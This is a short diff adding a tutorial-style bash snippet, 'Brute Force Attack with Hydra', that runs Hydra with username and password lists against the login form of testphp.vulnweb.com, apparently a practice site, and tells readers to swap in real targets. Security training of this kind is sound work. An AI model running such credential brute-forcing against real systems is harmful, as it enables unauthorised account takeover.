@@ -1,0 +1,12 @@
+
+
+Project 6: Brute Force Attack with Hydra and Burp Suite
+Brute Force Attack with Hydra
+Here’s a script to brute-force a login page using Hydra.
+
+
+#!/bin/bash
+# Brute force a login page with Hydra
+
+# Replace 'testphp.vulnweb.com' and other placeholders with actual data
+hydra -L usernames.txt -P passwords.txt testphp.vulnweb.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid username or password"
